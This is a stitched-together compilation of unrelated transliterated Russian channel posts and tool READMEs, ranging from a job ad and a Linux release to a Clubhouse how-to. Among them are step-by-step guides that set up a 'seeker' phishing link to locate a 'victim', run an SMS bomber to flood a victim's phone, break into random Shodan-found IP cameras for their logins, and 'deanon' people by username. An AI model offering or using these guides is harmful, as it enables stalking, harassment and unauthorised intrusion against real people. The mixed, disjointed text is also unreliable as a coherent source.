udalenno, no u nas est' ofisy v Moskve, Krasnodare, Tiumeni i Surgute; - grafik raboty: piatidnevnaia rabochaia nedelia (na sviazi s 10 do 17.00 MSK, rabota 8 chasov v den'); - zarabotnaia plata dogovornaia, vyplachivaetsia 2 raza v mesiats; - l'goty dlia sotrudnikov i chlenov sem'i na aviaperelety. - vozmozhny neprodolzhitel'nye komandirovki (ne bolee nedeli); - oplachivaemye bol'nichnye i otpuska; - uchastie v korporativnykh meropriiatiiakh Kompanii.    Sviazat'sia mozhno po ssylke: https://resumetrud.com/kaluga/vakansii/9227707/  #rabota_v_Rossii #rabota_Kaluga #Bekend_razrabotchikPython

Halogen is a tool to automate the creation of yara rules against image files embedded within a malicious document.Halogen helppython3 halogen.py -husage: halogen.py [-h] [-f FILE] [-d DIR] [-n NAME] [--png-idat] [--jpg-sos]Halogen: Automatically create yara rules based on images embedded in officedocuments.optional arguments:-h, --help            show this help message and exit-f FILE, --file FILE  File to parse-d DIR, --directory DIRdirectory to scan for image files.-n NAME, --rule-name NAMEspecify a custom name for the rule file--png-idat            For PNG matches, instead of starting with the PNG fileheader, start with the IDAT chunk.--jpg-sos             For JPG matches, skip over the header and look for theStart of Scan marker, and begin the match there.  Testing it outWe've included some test document files with embedded images for you to test this out with.  Running python3 halogen/halogen.py -d tests/ > /tmp/halogen_test.yara will produce the test yara file containing all images found within the files inside the tests/ directory... #embedded #halogen #python3 #scan #security #targetcfc #yara #yararules

30 POLEZNYKh I INTERESNYKh SAITOV DLIa OBUChENIIa      ONLAIN-KURSY  * edX -- onlain-kursy ot luchshikh universitetov mira. * Coursera -- besplatnye kursy ot prepodavatelei luchshikh vuzov so vsego mira.  * Highbrow -- ezhednevnaia podborka 5-minutnykh urokov u vas na pochte, mozhno vybrat' iz 300+ tem. * Skillshare -- ot animatsii i graficheskogo dizaina do mobil'noi razrabotki i kulinarii. * Lynda -- kursy o tekhnologiiakh, biznese i kreativnosti.  * CreativeLive -- besplatnye kreativnye kursy ot mirovykh ekspertov v priamom efire. * Udemy -- kursy po komp'iuternym spetsial'nostiam.    PROGRAMMMIROVANIE  * Codecademy -- interaktivnaia onlain-platforma po obucheniiu 12 iazykam programmirovaniia: Python, PHP, JavaScript, Ruby, Java i dr., a takzhe rabote s bibliotekoi jQuery i iazykam razmetki i oformleniia veb-stranitsy HTML i CSS. * Udacity -- kursy ot Google, Facebook, mongoDB, AT&T i drugikh krupnykh kompanii.  * Platzi -- kursy po dizainu, marketingu i programmirovaniiu.  * Learnable -- kursy po veb-razrabotke.  * Code.org -- uroki po programmirovaniiu dlia nachinaiushchikh.  * HTML Academy -- interaktivnye kursy dlia kazhdogo, kto khochet okunut'sia v mir viorstki i programmirovaniia. * HtmlBook -- osnovy HTML i CSS dlia samostoiatel'nogo izucheniia. * Khekslet -- obrazovatel'naia platforma, pomogaet novichkam stat' veb-razrabotchikami. * Code Avengers -- na etom resurse predstavleno tri vida kursov: HTML + CSS, JavaScript i Python3. * W3schools -- Na etom resurse sobrany uchebniki, kotorye prigodiatsia kak programmistam, tak i veb-dizaineram.    ANGLIISKII IaZYK  * Puzzle English -- izuchaite angliiskii iazyk s pomoshch'iu urokov, igr i trenazherov. * Duolingo -- izuchenie angliiskogo onlain na komp'iutere i v odnoimennom prilozhenii. * Lingust -- izuchenie inostrannykh iazykov s nulia. Est' besplatnyi kurs po angliiskomu iazyku sostoiashchii iz 50+ urokov. * Begin English -- besplatnyi samouchitel' po angliiskomu, soderzhit 100+ urokov.    BONUS   * TEDed -- kategoriia obrazovatel'nykh video s konferentsii TED.  * Khan Academy -- ogromnaia biblioteka interaktivnogo kontenta.  * Openedu -- kursy ot vedushchikh vuzov Rossii. * Lektorium -- onlain-kursy i lektsii ot vedushchikh vuzov. * Teorii i praktiki -- nauchno-prosvetitel'skoe media o lichnom i  professional'nom razvitii. * Netologiia -- marketing, dizain, programmirovanie, soft skills i mnogoe drugoe. * Arzamas -- istoriia kul'tury v video, tekstakh i fotografiiakh. * Universarium -- platforma onlain-kursov ot luchshikh vuzov Rossii. Na platforme mozhno naiti kursy po samym raznym napravleniiam. * HubSpot -- onlain-kursy po marketingu, blogingu, smm i mnogoe drugoe.

Vychisliaem tochnoe mestopolozhenie s pomoshch'iu termux  V etom nam pomozhet takaia utilita kak seeker. Ego kontseptsiia ochen' prosta, on sozdaet "fishingovuiu" ssylku, kotoraia zaprashivaet mestopolozhenie, i vaulia. Mestopolozhenie zhertvy u nas. No ne vsio tak prosto, kak zvuchit, po krainei mere est' odna problema - kak zastavit' cheloveka pereiti po ssylke ? Eto uzhe vsio zavisit ot vashego myshleniia, i znaniia SI. Itak, davaite po poriadku razberemsia.   Instruktsiia po ustanovke:  Pervym delom skachivaem Termux i obnovim pakety:  pkg update pkg upgrade  Teper' skachivaem neobkhodimye nam instrumenty:  pkg install git pkg install openssh  Nu a dal'she ostaetsia samoe prostoe, eto skachat' instrument i zapustit' avtomaticheskuiu ustanovku:  git clone https://github.com/thewhiteh4t/seeker.git cd seeker/ chmod 777 termuxinstall.sh ./termuxinstall.sh  Posle, uspeshnoi ustanovki my zapuskaem sam instrument:  python3 seeker.py  I tut my opiat' stalkivaemsia s problemoi. Seichas ob'iasniu. My zapustili siker, no dlia ego ispol'zovanie nuzhno ves' trafik perevodit' v internet (nubskimi slovami). Dlia etogo est' dva instrumenta - eto Ngrok, i Serveo.   Ia pokazhu kak sdelat' vsio na serveo, potomu chto aktivno pol'zuius' im.  Dlia etogo my otkryvaem vtoruiu sessiiu v termuks i vvodim odnu komandu:  ssh -R 80:localhost:8080 ssh.localhost.run  Gotovo teper' kopiruem ssylku iz vtoroi sessii, gde my sobstvenno sdelali nekii tunel', i kidaem zhertve. (p.s esli ne budet rabotat', vkliuchite VPN)   Programma vydast nam, operatsionnuiu sistemu, aipi, koordinaty, i ssylka na gugl karty.

Moshchnyi sms bomber na 50 servisov  Vsem privet! Reshil opublikovat' dlia vas ochen' moshchnyi sms bomber na python.   Pristupim:  $ pkg update $ pkg upgrade $ pkg install python $ pkg install git  Teper' kogda vse zavisimosti ustanovleny, mozhno pristupit' k ustanovke samogo bombera.  Snachala nuzhno skopirovat' repozitorii:  $ git clone https://github.com/lime542/top_bomber.git  Otkryvaem papku s bomberom:  $ cd top_bomber  Teper' nuzhno ustanovit' nuzhnye nam biblioteki:  $ pip3 install -r requestments.txt  Zapuskaem:  $ python3 bomber.py  U vas poiavitsia vot takoe meniu, vy dolzhny vvesti nomer telefona(primer:79876543210) i nazhat' enter. Posle etogo vashu zhertvu prosto zavalit soobshcheniiami.    Nash vtoroi proekt: ALCATRAZ

Chut' bol'she chem cherez 1,5 goda posle vykhoda 7-i versii distributiva Mageia sostoialsia reliz 8-i versii distributiva.  V etoi versii v ofitsial'nom repozitorii na moment reliza: * kernel 5.10.16 * rpm 4.16.1.2 * dnf 4.6.0 * Mesa 20.3.4 * Plasma 5.20.4 * GNOME 3.38 * Xfce 4.16 * Firefox 78 * Chromium 88 * LibreOffice 7.0.4.2 * glibc 2.32 * GCC 10.2.1 * clang 11.0.1 * FPC 3.2.0 * lazarus 2.0.10.2 * Python3 3.8.7 * ruby 2.7.2 * perl 5.32.1 * openjdk 11.0.10-ea  Osobennosti reliza: * Metadannye urpmi teper' vmesto xz zhmutsia Zstd dlia bolee bystrogo parsinga. * Bol'shinstvo modulei Python'a 2 i softa na niom zhe byli udaleny. * Uluchshena podderzhka arkhitektura ARM, no ustanovochnykh obrazov dlia etoi arkhitektury poka chto tak i ne sushchestvuet (sushchestvuiut tol'ko pakety). Rabota nad nimi v protsesse, konkretnye sroki razrabotchiki ne obeshchaiut.  Distributiv Mageia, napominaiu, osnovan uvolennymi razrabotchikami distributiva Mandriva (kotoryi vposledstvii stal OpenMandriva, a do etogo byl Mandrake).  Ustanovochnye obrazy mozhno skachat' s zerkal: https://mirrors.mageia.org/ .  Podrobnosti: https://blog.mageia.org/en/2021/02/26/made-it-to-a-byte-announcing-the-release-of-mageia-8/ .

An open source implementation of the grantor role in Apple's Wi-Fi Password Sharing protocol.  DisclaimerOpenWifiPass is experimental software and is the result of reverse engineering efforts by the Open Wireless Link project.  The code serves solely documentary and educational purposes. It is untested and incomplete.  For example, the code does not verify the identity of the requestor. So, do not use this implementation with sensitive Wi-Fi credentials.  OpenWifiPass is not affiliated with or endorsed by Apple Inc.RequirementsHardware: Bluetooth Low Energy radio, e.g., Raspberry Pi 4  OS: Linux (due to the bluepy dependency)  InstallClone this repository and install it:    RunRun openwifipass to share Wi-Fi credentials (SSID and PSK) with any requestor (we need super user privileges to use the Bluetooth subsystem):  sudo -E python3 -m openwifipass --ssid  --psk   Use quoting of your shell to remove special meaning of certain characters in SSID/PSK. In the example below, we use single quotes (') to prevent shell expansion of the $ character in the PSK... #bluetooth #bluetoothlowenergy #linux #macos #mitm #mitmattacks #opack #openwifipass #passwordsharing #reverseengineering..

"Lenivyi" pentest IP-kamer s pomoshch'iu instrumenta Expcamera, napisannogo na iazyke programmirovaniia Python 3. Probuem randomnyi vzlom kamer ispol'zuia API-kliuch servisa Shodan.  1. Zakhodim na https://www.shodan.io/. Registriuemsia. Loginimsia na servise i poluchaem API-key, kotoryi budet ispol'zovat' instrument Expcamera v buduiushchem. 2. Skachivaem s github sobstvenno sam instrument https://github.com/vanpersiexp/expcamera (git clone - dlia ne znaiushchikh v terminale). Ustanavlivaem vse neobkhodimye biblioteki cherez pip install. 3. Zapuskaem. Sintaksis python3 exploit_camera.py -b 2 --shodan vash_API-key. Kstati mozhno ispol'zovat' i drugie parametry ili voobshche ne ispol'zovat' kliuch Shodan servisa esli vasha tsel' - 1 kamera i vy predpolagaete chto ona uiazvima 4. Zhdem v avtomaticheskom rezhime perebor i avtomaticheskii test na uiazvimost'. Ekspluatatsiia proiskhodit tak zhe v avtomaticheskom rezhime. Pri uspeshnykh rezul'tatakh poluchaem paru login/parol' ot Web-interfeisa kamery ili eio TFTP-servera. 5. Kak zalit' modifitsirovannuiu proshivku s bekdorom/shellom i kak sobstvenno sobrat' takuiu proshivku tulcheinom kak nibud' napishu nemnogo pozzhe - kak nastroenie budet ^^. Kak vsegda skrinshoty vzloma v kachestve primera prilagaiutsia. Takoi instrument ideal'no podoidet v testirovanii sistemy videonabliudeniia sostoiashchei iz modelei raznykh vendorov i modelei kamer (naprimer na predpriiatii). I da ne zabyvaem ispol'zovat' tor/vpn. 6. C menia eshche stat'ia kak osushchestvliat' audit bezopasnosti kamer ispol'zuia Onvif v kamerakh.

Esli v vashei kompanii aktivno ispol'zuetsia domen Windows, rano ili pozdno pered vami vstanet zadacha povysit' bezopasnost' ispol'zuemykh parolei. Shtatnykh sredstv (krome trivial'noi gruppovoi parol'noi politiki) tut net, normal'nykh produktov tozhe net. Paroli khraniatsia v vide kheshei, kotorye eshchio i dostatochno slozhno dostat', poetomu priamoi analiz bezopasnosti ne vozmozhen. Ia popytalsia postroit' protsess, kotoryi, pri nuzhnoi snorovke, ne zaimet u vas bol'she neskol'kikh chasov i budet prekrasno povtoriaem. Mozhno budet napriamuiu otslezhivat', kak vashi usiliia uvelichivaiut stoikost' parolei v kompanii, a eto vsegda priiatno.

Ia popytalsia postroit' protsess, kotoryi, pri nuzhnoi snorovke, ne zaimet u vas bol'she neskol'kikh chasov i budet prekrasno povtoriaem. Mozhno budet napriamuiu otslezhivat', kak vashi usiliia uvelichivaiut stoikost' parolei v kompanii, a eto vsegda priiatno.
Privetstvuiu, ia nachinaiushchii python razrabotchik. Pishu parsery, boty, avtomatizatsiia rutinnykh zadach.  Stek: python3, requests, bs4, Selenium, Scrapy  Est' otzyvy na birzhakh

Deanon cheloveka s pomoshch'iu termux  I tak, snachala ustanovim zavisimosti:  pkg update pkg upgrade apt install git python  Kopiruem repozitorii:  pkg update pkg upgrade git clone https://github.com/snooppr/snoop.git  Teper' nuzhno otkryt' direktoriiu: cd snoop  A seichas nuzhno obnovit' bazy dannykh snoop:  python3 snoop.py --update y  Snoop ustanovlen, teper' mozhno pereiti k ispol'zovaniiu! Snachala pochmotrim kliuchi dlia ispol'zovaniia: Chtoby naiti nik bez probelov, my dolzhny vpisat' takuiu komandu:  python3 snoop.py   Imia bez probela No esli vam nuzhno vpisat' nik s probelom, to vy dolzhny ispol'zovat' kavychki: python3 snoop.py "imia s probelom" Dannaia utilita prosto pokazyvaet forumy i sots seti na kotorykh zaregestrirovan chelovek s dannym nikom. Imeia mozg, vy smozhete sdelat' deanon liubogo cheloveka)

__Moshchnyi sms bomber na 50 servisov__  I tak, snachala nam nuzhno ustanovit' vse zavisimosti: na vopros "Do you want to continue? [Y/n]" otvechaem Y, i nazhimaem enter  pkg update pkg upgrade pkg install python pkg install git  Teper' kogda vse zavisimosti ustanovleny, mozhno pristupit' k ustanovke samogo bombera.  Snachala nuzhno skopirovat' repozitorii:  git clone https://github.com/lime542/top_bomber.git  Otkryvaem papku s bomberom:  cd top_bomber  Teper' nuzhno ustanovit' nuzhnye nam biblioteki:  pip3 install -r requestments.txt  i zapustit' sam bomber:  python3 bomber.py  U vas poiavitsia  meniu, vy dolzhny vvesti nomer telefona(primer:70123456789) i nazhat' enter. Istochnik: habr.com    Podpisyvaemsia:    vk.com/scienceandlive    #clubhouse #android #vendorlock #iphone #clubhousepy #sotsial'nyeseti  Clubhouse bez iPhone. How-to instruktsiia  Diskleimer  V etoi stat'e ia rasskazhu, kak zapustit' Clubhouse bez iPhone s pomoshch'iu konsol'nogo python prilozheniia, kotoroe pozvolit pol'zovat'sia bol'shinstvom funktsii sotsial'noi seti. Clubhouse okazalsia teploi lampovoi ploshchadkoi, no dlia vladel'tsev androidov vrode menia eta sotsset' nedostupna. Ofitsial'naia versiia dlia guglovskoi platformy, po slukham, vyidet ne ranee maia.  Avtor stat'i otkazyvaetsia ot liuboi otvetstvennosti za nepravomernoe ispol'zovanie poluchennykh znanii i napominaet chto stat'ia sdelana s obuchaiushchei i spravochnoi tsel'iu. Sozdavat' botov, uchastvovat' v kiberbullinge i prochikh plokhikh veshchakh kraine ne rekomenduetsia.      ( UPD ot 20.02.2021 ) Shag 0. Neofitsial'nyi klient pod android:  Peterburgskii razrabotchik Grishka vypustil neofitsial'nyi klient pod android:  https://github.com/grishka/Houseclub/releases      Shag 1. Virtual'nyi iPhone  Dlia togo, chtoby zaregistrirovat'sia v prilozhenii vam ponadobitsia servis, predlagaiushchii avtomatizirovannoe testirovanie mobil'nykh telefonov. V tselom mozhno oboiti eto trebovanie i zaregistrirovat'sia s ispol'zovaniem reversnutoi biblioteki, no veroiatno vas smogut vychislit' i zabanit'. K tomu zhe v virtual'noi labe vy smozhete potykat' prilozhenie do vykhoda android versii i zafollovit' ponravivshikhsia liudei, chtoby u vas byl spisok komnat s vashimi interesami. Na rynke est' neskol'ko takikh servisov. Ia ostanovilsia na browserstack.com -- tam est' vozmozhnost' poluchit' dostup k real'nomu iphone, kotoryi lezhit gde-to v servernoi i ego ekran rassharivaetsia na veb-prilozhenie. Nam ponadobitsia funktsional App Live -- on dostupen tol'ko po podpiske. Ia chestno otdal poriadka 40 dollarov za odin mesiats testirovaniia. Krome etogo, nam ponadobitsia liuboe .ipa prilozhenie, chtoby servis pozvolil vam zapustit' vybrannuiu model' iPhone'a:    iPhone 11 na app-live.browserstack.com  iPhone 11 na app-live.browserstack.com  Nikakikh dopolnitel'nykh nastroek ne nado - zakhodim v App Store pod svoim Apple ID i ustanavlivaem Clubhouse:    Ustanovka prilozheniia Clubhouse  Ustanovka prilozheniia Clubhouse  Prilozhenie poprosit vash telefonnyi nomer, prishlet kod na vash real'nyi telefon, i tut vam ponadobitsia priglashenie v Clubhouse, zaranee pozabot'tes', chtoby kto-to iz druzei v prilozhenii vam ego otpravil na vash nomer telefona. Posle polucheniia priglasheniia zapolnite informatsii o sebe v bio -- eto edinstvennoe mesto v prilozhenii, gde mozhno rasskazat' o sebe tekstom. Interfeis prostoi, glavnoe podpisat'sia na interesnykh vam liudei, chtoby dal'she mozhno bylo legko nakhodit' komnaty dlia proslushivaniia v konsoli:    Poisk liudei v prilozhenii Clubhouse cherez onlain-dostup k real'nomu iPhone  Poisk liudei v prilozhenii Clubhouse cherez onlain-dostup k real'nomu iPhone  U vsekh onlain-servisov po testirovaniiu mobil'nykh telefonov est' nedostatok: oni ne umeiut perenapravliat' zvuk i mikrofon na vash brauzer. To est' s etogo <<emuliatora>> vy ne smozhete poslushat' v Clubhouse ni odnoi besedy i sami skazat' nichego ne smozhete. Chtoby obshchat'sia v komnatakh i slushat', chto govoriat drugie, vam pridetsia zapustit' python prilozhenie na svoem komp'iutere.    Shag 2. Slubhouse-py  Dlia proslushivaniia komnat i dlia dialogov budem ispol'zovat' konsol'noe python prilozhenie. Brat' otsiuda: https://github.com/stypr/clubhouse-py    Ono osnovano na reversnutom protokole clubhouse'a i avtor obeshchaet udalit' prilozhenie posle vykhoda normal'noi versii dlia androida. Dlia raboty prilozheniia trebuetsia Python versii 3.7 i vyshe. Prilozhenie rabotaet pod Windows i macos.  Ustanovka prostaia:    git clone https://github.com/stypr/clubhouse-py  cd ./clubhouse-py  pip3 install -r requirements.txt  pip3 install agora-python-sdk  Dlia zapuska vypolnite:    python3 cli.py  Esli u vas vse zarabotalo s pervogo raza -- pozdravliaiu!    No skorei vsego budut problemy.  Vo-pervykh, na 19 fevralia 2021 sborka biblioteki agora-python-sdk pod Windows slomana, poetomu vmesto ustanovki cherez pip luchshe sobrat' proekt rukami. Instruktsiia zdes': https://github.com/AgoraIO-Community/Agora-Python-SDK#installation    Vo-vtorykh, dlia macos nado dat' razresheniia na dostup k Mikrofonu ( Microphone ) i Universal'nyi Dostup ( Accessability ) dlia terminala i python'a. A takzhe, veroiatno, potrebuetsia izmenit' kombinatsiiu klavish dlia "podniatiia ruki", tak kak v dvuiazychnom make normal'no ne rabotaet modul' dlia bindinga goriachikh klavish. Dlia etogo otkroite v liubom redaktore cli.py i izmenite :    if not channel_speaker_permission:   print("[*] Press [Ctrl+Shift+H] to raise your hands for the speaker permission.")   keyboard.add_hotkey(   "ctrl+shift+h",   _request_speaker_permission,   args=(client, channel_name, user_id)   )  na chto-to podobnoe:    if not channel_speaker_permission:   print("[*] Press [3] to raise your hands for the speaker permission.")   keyboard.add_hotkey(   "3",   _request_speaker_permission,   args=(client, channel_name, user_id)   )  V-tret'ikh, v macos iz-za bindinga klavish prilozhenie nado zapuskat' pod rutom:    sudo python3 cli.py  Posle zapuska prilozhenie poprosit ukazat' nomer telefona i vvesti kod dlia autentifikatsii, posle chego sokhranit poluchennyi token v settings.ini  Vot tak vygliadit zapushchennoe klientskoe prilozhenie:    konsol'nyi interfeis upravleniia clubhouse-py  konsol'nyi interfeis upravleniia clubhouse-py  Eshche vazhnyi moment: konsol'noe prilozhenie po-umolchaniiu otobrazhaet 20 zapisei v spiske kanalov i 20 pol'zovatelei v kanalakh. Chtoby uvelichit' limity mozhno izmenit' znachenie peremennoi max_limit v faile cli.py:    max_limit = 30  Vyvod  Ia smog protestirovat' Clubhouse i polnotsenno zaregistrirovat' sebia i eshche neskol'kikh druzei takim sposobom. I uzhe neskol'ko dnei slushaiu besedy i periodicheski obshchaius' v nikh.  U prilozheniia na python'e est' nedostatki: samyi glavnyi - eto konsol'nyi interfeis. Vy ne uvidite obnovleniia spiska spikerov i ne smozhete vkliuchat'/vykliuchat' vash mikrofon iz prilozheniia. Kak workaround vkliuchaite/vykliuchaite mikrofon drugimi sposobami. Krome togo, spisok dostupnykh besed ogranichen kolichestvo strok i vozmozhna situatsiia, kogda vy ne uvidite nuzhnuiu vam besedu. Nemnogo poeksperimentirovav, ia ne nashel sposoba vyvodit' bol'she 30 zapisei v spiske besed, no dumaiu chto takoi sposob tochno est'. Inogda pomogaet sokhranit' channel_name otdel'no i podkliuchat'sia napriamuiu po adresu. Adres besedy mozhno vziat' iz ssylki na sobytie, naprimer: https://www.joinclubhouse.com/event/M1e7eO3N. Prilozhenie ne sozdaet podpisku na sobytiia ( eto ne realizovano v protokole clubhouse-py ), poetomu vy ne smozhete poluchat' priglasheniia na privatnye besedy i prochie opoveshcheniia. No chast' problem mozhno reshit', ispol'zuia virtual'nye laby s iPhone'ami. Naprimer, eto udobno dlia togo, chtoby posmotret' spisok predstoiashchikh meropriiatii, podpisat'sia na kakikh-to izvestnykh liudei i prosto poiskat' svoikh druzei.    V obshchem, esli net aifona, no est' mozgi, to reshit' problemu s populiarnym prilozheniem mozhno. Obratnoe ne rabotaet.    Spasibo za vnimanie!    UPD na 20.02.2021:  Neskol'ko novostei:    1. Vypushchen neofitsial'nyi klient pod android:  https://github.com/grishka/Houseclub/releases    2. Dlia zapuska pod linux pomozhet kommentarii @yakimka8 :    Na linukse poslushat' komnaty ne poluchitsia, tak kak pod linuks net agora-python-sdk. No, mozhno vospol'zovat'sia demkoi ot agory webdemo.agora.io/agora-web-showcase/examples/LargeGroupVideoChat-Web    Chtoby uprostit' zakhod v chat, mozhno sdelat' tak:    # Check for the voice level.  if RTC:   token = channel_info['token']   RTC.joinChannel(token, channel_name, "", int(user_id))  else:   print("[!] Agora SDK is not installed.")   print(" You may not speak or listen to the conversation.")   # Dobavliaem ssylku na sait s parametrami   print(' But you can use this link:')   print(f' https://webdemo.agora.io/agora-web-showcase/examples/LargeGroupVideoChat-Web/?appID=some_app_id&channel={channel_name}&token={channel_info["token"]}&mode=live&codec=h264&role=audience')   print(' user_id: ', user_id)if RTC: token = channel_info['token']  Teper' pri vybore chata, cli budet ne tol'ko govorit' chto Agora SDK ne  ustanovleno, no takzhe predlagat' pereiti po ssylke i poslushat' besedu v  brauzere.    Sootvetsvenno zakhodim v cli, vybiraem komnatu, kopiruem svoi user_id,  perekhodim po ssylke, vstavliaem user_id v pole <<Advanced settings ->  UID>> i nazhimaem <<Join>>    3. Esli ne khotite zamorachivat'sia s pervym shagom i ispol'zovat' platnyi onlain-servis, to samoe prostoe eto poprosit' vashikh druzei zaregistrirovat' vas ( ochevidnaia ideia, no luchshe ozvuchit' ). Inache mozhete poprobovat' zaregistrirovat'sia cherez clubhouse-py, no povtorius' - potentsial'no vas mogut zabanit'.
Prodolzhaiu publikatsiiu reshenii otpravlennykh na doreshivanie mashin s ploshchadki HackTheBox. Nadeius', chto eto pomozhet khot' komu-to razvivat'sia v oblasti IB.

Buratinoscanner - luchshii skaner IP  Proshu obratit' vnimanie! Administratsiia kanala ne nesiot otvetstvennosti za liubye posledstviia vsled ispol'zovaniia predostavlennoi informatsii. Vse materialy opublikovany iskliuchitel'no v obrazovatel'nykh tseliakh!  V zhizni kazhdogo pentestera vstrechaetsia moment kogda nuzhno uznat' informatsiiu pro kakoi-to IP-adres.  IP-adres -- unikal'nyi setevoi adres uzla v komp'iuternoi seti, postroennoi na osnove steka protokolov TCP/IP.  V seti Internet trebuetsia global'naia unikal'nost' adresa; v sluchae raboty v lokal'noi seti trebuetsia unikal'nost' adresa v predelakh seti.  Poekhali!   Obnovim pakety: apt update  Kachaem pakety: apt install python3  Teper' instrument: git clone https://github.com/l0qi/Buratinoscanner  Zapusk: cd Buratinoscanner pip install -r requirements.txt  I teper' pishem IP-adres, i vse. Konets!

Ochen' khochetsia rasskaat' pro sistemu sborki PO Meson. Meson dovol'no udoben i predskazuem. Razrabatyvaetsia s 2012 goda.  Pisan na Python. Da, ne vsem ponravitsia.  Osnovnye vozmozhnosti:  * Sborka osushchestvliaetsia dlia iazykov C++,C, Java, Vala;  * Mnogoplatformennost' (podderzhivaetsia sborka na GNU/Linux, MacOS, Windows);  * Vstroennyi mnogoplatformennyi obrabotchik zavisimostei, rabotaiushchii sovmestno s paketami v distributivakh; Et cereta!  Ustanovka na Debian 10.8: sudo aptitude install python3 nijia-build  Khochu razobrat' eto na primere GNOME Shell (sortsy kachat' s ikh gita). Poetomu cherez neskol'ko dnei zhdite stat'iu  .

Khei, snova LIFE na sviazi! V 16:00 subboty (20.02), v 161 auditorii, budem navodit' suetu.   Plan takoi: * Razberiom printsip raboty HTTP protokola. Chto takoe cookie, localstorage, HTTP Auth Basic. * Razberiom obshchenie mezhdu klientom i serverom po HTTP protokolu. * Uznaem o soketakh, kak s nimi rabotat' i zachem oni nam voobshche nuzhny v CTF. * Nauchimsia pisat' sdavalku flagov v zhiuri-sistemu. * Nauchimsia delat' slozhnye HTTP zaprosy, v t.ch putiom perekhvata HTTP zaprosa. * Razberiom prosteishie oshibki konfiguratsii i uiazvimosti veb-serverov. * Nauchimsia iskat' "skrytye" direktorii na servere.  Predustanovit' PO na Kali: - Postman  sudo apt install snapd;   sudo systemctl unmask snapd.service;  sudo systemctl enable snapd.service;  sudo systemctl start snapd.service;  sudo snap install postman;   - Wfuzz  sudo apt install python3-pip;  pip3 install wfuzz;   Pros'ba, ne opazdyvat'. Materiala mnogo. Ne zabyvaite maski, studencheskie, setevye fil'try, zhelanie trenirovat'sia i khoroshee nastroenie.

Darkdump is a simple script written in Python3.9 in which it allows users to enter a search term (query) in the command line and darkdump will pull all the deep web sites relating to that query. Darkdump wraps up the darksearch.io API.Installation    git clone https://github.com/josh0xA/darkdump  cd darkdump  python3 -m pip install -r requirements.txt  python3 darkdump.py --help    UsageExample 1: python3 darkdump.py --query programmingExample 2: python3 darkdump.py --query="chat rooms"Example 3: python3 darkdump.py --query hackers --page 2    the 'page' argument filters through the second page of the results that the darksearch engine returns    Menu____          _     _|    \ ___ ___| |_ _| |_ _ _____ ___|  |  | .'|  _| '_| . | | |     | . ||____/|__,|_| |_,_|___|___|_|_|_|  _||_|Developed By: Josh Schiavonehttps://github.com/josh0xAjoshschiavone.comusage: darkdump.py [-h] [-v] -q QUERY [-p PAGE]optional arguments:-h, --help            show this help message and exit-v, --version         returns darkdump's version-q QUERY, --query QUERYthe keyword or string you want to search on the deepweb-p PAGE, --page PAGE  the page number to filter through..

Ustanovka GO i nastroika NVIM v terminale  sudo apt install python3-pip pip3 install pynvim  sudo snap install go go version  #sudo apt install vim curl - ne aktual'no sudo snap install nvim  echo "# Map vi and vim to nvim alias vi='nvim' alias vim='nvim'" >> .bashrc  mkdir -p ~/.config/nvim/ mkdir -p ~/dev/go/src ~/dev/go/pkg ~/dev/go/bin echo "GOPATH=$HOME/dev/go/" >> ~/.bashrc source ~/.bashrc echo $GOPATH  zakhodim na https://vim-bootstrap.com/, sozdaiom generate.vim i kopiruem v .config/nvim/  mv ~/.config/nvim/generate.vim ~/.config/nvim/init.vim less ~/.config/nvim/init.vim  echo "Plug 'Shougo/deoplete.nvim', {'do':':UpdateRemotePlugins'}" >> ~/.config/nvim/init.vim  cd ~/dev/go/src nvim nvim main.go  https://medium.com/@goelankit/setting-up-neovim-for-golang-on-ubuntu-18-04-aa3cc2f088f7

Patriot Linux is a  HIDS for desktop users who wants real time graphical alerts when something suspicious happens  Patriot detect:  1- Suspicious process running  2- New process starting TCP/IP Connection  3- Auditd alerts  4- New keyboards plugged  InstallationYou need to configure Auditd with this suggested rules https://github.com/Neo23x0/auditd (you can use your own rules and simply modify keywords in the code)  Install xinput (apt install xinput or yum install xorg-x11-server-utils)  And then simply download py files and run python3 patriot.py  Tested in CentOS/Fedora and Debian/Ubuntu   #hids #linux #patriot-linux #python3 #realtime #tcpip

All in one tools for CRYPTOLOGY.  Instagram: Capture the RootScreenshotsHow to use  FeaturesThis tool include:    HASH  RSA  XOR    AES (CBC)  DES (ECB)  FERNET  RC2  RC4  CHACHA20POLY1305  TRANSPOSITION  DIFFIE HELMAN  IMAGE ENCRYPT/DECRYPT  FILE ENCRYPT/DECRYPT Installation  Installation with requirements.txtgit clone https://github.com/capture0x/cyphercd cypherpip3 install -r requirements.txt  Usage  python3 cryptot.py  HASHEncryption and decryption algorithms ==> BASE64 MD5 SHA1 SHA384 SHA256 SHA512  RSAEncrypts strings by generating public and private keys  IMAGE ENCRYPT/DECRYPTKey and iv value must be 16 or 32 bytes, then specify the path of your image  ex: key==> 1234567812345678 iv ==> 1234567812345678 path ==> /home/user/Desktop/a.jpg  FILE ENCRYPT/DECRYPTEncryption ==> Specify the path to the files you want to encrypt  ex: /home/user/Desktop  Bugs and enhancementsFor bug reports or enhancements, please open an issue here. Paru nedel' nazad komanda Vulners opublikovala sravnenie neskol'kikh populiarnykh WAF. Poimav sebia na mysli -- <<a kak otsenivat' kachestvo ego raboty?>>, ia reshil razobrat' podrobnee temu security-testov i kriteriev otsenki Web Application Firewall. Stat'ia prigoditsia, v pervuiu ochered', tem, komu interesna tema veb-bezopasnosti, rovno kak i schastlivym obladateliam WAF.

S prikhodom v nashu zhizn' razlichnogo roda umnykh rozetok, lampochek i drugikh podobnykh ustroistv, neobkhodimost' nalichiia veb-saitov na mikrokontrollerakh stala neosporimoi. A blagodaria proektu lwIP (i ego mladshemu bratu uIP) podobnym funktsionalom nikogo ne udivish'. No poskol'ku lwIP napravlen na minimizatsiiu resursov, to s tochki zreniia dizaina, funktsionala, a takzhe udobstva ispol'zovaniia i razrabotki, podobnye saity sil'no otstaiut ot tekh, k kotorym my privykli. Dazhe dlia vstroennykh sistem, sravnit', naprimer, s saitom dlia administrirovaniia na samykh deshevykh routerakh. V dannoi stat'e my poprobuem razrabotat' sait na Linukse dlia kakogo-nibud' umnogo ustroistva i zapustit' ego na mikrokontrollere.

